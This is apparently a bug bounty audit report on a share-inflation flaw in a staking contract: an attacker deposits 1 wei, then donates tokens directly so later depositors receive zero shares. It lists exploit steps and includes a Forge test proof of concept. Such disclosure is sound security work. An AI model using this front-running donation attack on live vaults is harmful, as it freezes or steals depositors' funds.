# 57482 sc critical front running a donation can inflate the share causing users to lose funds

**Submitted on Oct 26th 2025 at 15:38:40 UTC by @ox9527 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* Report ID: #57482
* Report Type: Smart Contract
* Report severity: Critical
* Target: <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* Impacts:
  * Permanent freezing of funds

{% hint style="danger" %}
Critical: Front-running a donation and direct token transfers to the staking contract can permanently inflate shares and cause subsequent users to receive zero shares for their deposits, resulting in loss of funds.
{% endhint %}

## Description

### Brief / Intro

In `Staking.sol::deposit()`, a minimum deposit amount is enforced. An attacker can front-run by depositing just 1 wei into the staking contract and then transferring additional `LONG` tokens directly to it.

This manipulates the share calculation, leading to share inflation, which causes subsequent users to receive zero shares for their deposits and ultimately suffer a loss of funds.

### Vulnerability Details

In `Staking.sol::deposit()` the contract calls:

```solidity
function _deposit(address by, address to, uint256 assets, uint256 shares) internal override {
    super._deposit(by, to, assets, shares); <@
    // lock freshly minted shares
    stakes[to].push(Stake({shares: shares, timestamp: block.timestamp})); 
}
```

The sequence allows an attacker to create a situation where the contract's token balance increases (via direct token transfer / "donation") after a minimal deposit, inflating the assets-versus-shares ratio and causing following deposits to mint zero shares.

### Impact Details

* Subsequent users can receive zero shares for their deposits.
* Funds may become effectively frozen or lost for honest users who can no longer obtain shares proportional to their deposits.

## Exploit steps

{% stepper %}
{% step %}

### Step: Attacker makes a minimal deposit

Attacker deposits the minimum enforced amount (e.g., 1 wei) via `deposit()` so they receive shares.
{% endstep %}

{% step %}

### Step: Attacker donates additional tokens directly

Attacker transfers additional `LONG` tokens directly to the staking contract (not via `deposit()`), increasing the contract's token balance without minting shares.
{% endstep %}

{% step %}

### Step: Share calculation is skewed

Because the contract's asset balance increases while total shares remain nearly unchanged, the assets-per-share ratio inflates. Subsequent deposit calls compute shares using the new (inflated) ratio and may mint zero shares for honest users.
{% endstep %}
{% endstepper %}

## Proof of Concept

<details>

<summary>Solidity Forge test PoC (expand to view)</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Staking} from "../contracts/v2/periphery/Staking.sol";
import "node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "node_modules/@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/console2.sol";

contract Long is ERC20 {
    constructor() ERC20("LONG Mock", "Long") {
        _mint(msg.sender, 1_000_000_000_000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}
contract StakingTest is Test {

    Staking public staking;
    Long public long;
    function setUp() public {
        staking = new Staking();
        long = new Long();
        staking.initialize(address(this), address(this), address(long));
    }

    function test_POC_12() public {
        address alice = address(0x1001);
        address bob = address(0x1002);
        address eve = address(0x1003);

        long.mint(alice,10e18);
        long.mint(bob,10e18);
        long.mint(eve,10e18);

        vm.startPrank(alice);
        long.approve(address(staking), 1e18);
        staking.deposit(1,alice);

        //donate.
        long.transfer(address(staking), 1e18);
        vm.stopPrank();

        //bob.
        vm.startPrank(bob);
        long.approve(address(staking), 1e18);
        staking.deposit(1e17,bob);
        vm.stopPrank();

        assertEq(staking.balanceOf(bob), 0);
    }

}
```

</details>

## References

* Target contract: <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>

(End of report)
